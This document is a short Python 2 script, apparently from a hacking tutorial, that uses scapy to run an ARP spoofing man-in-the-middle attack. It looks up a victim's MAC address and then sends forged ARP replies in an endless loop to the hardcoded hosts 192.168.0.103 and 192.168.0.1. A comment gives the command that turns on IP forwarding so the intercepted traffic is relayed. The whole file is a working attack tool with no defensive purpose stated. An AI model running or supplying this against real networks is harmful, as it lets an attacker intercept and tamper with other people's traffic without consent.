#python 2
# To make your pc a router you need to give the command on termianl
#echo 1 > /proc/sys/net/ipv4/ip_forward
import scapy.all as scapy
import time


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
# this line will return 2 lists, answered and unanswered.Timeout will specify time to request
    answered_list = scapy.srp(arp_request_broadcast,timeout=4,verbose=False)[0]#verbose=False for no output on console
    return answered_list[0][1].hwsrc
    # print(answered_list[0][1].hwsrc)


def spoof(target_ip,spoof_ip):
    target_mac = get_mac(target_ip)

    #op=1 for sending op=2 for receiveing
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet)

send_packets_count = 0
while True:
    spoof("192.168.0.103","192.168.0.1")
    spoof("192.168.0.1","192.168.0.103")
    # \r means always start from the start of the line
    print("\r[+] Packets sent "+str(send_packets_count)),

    time.sleep(2)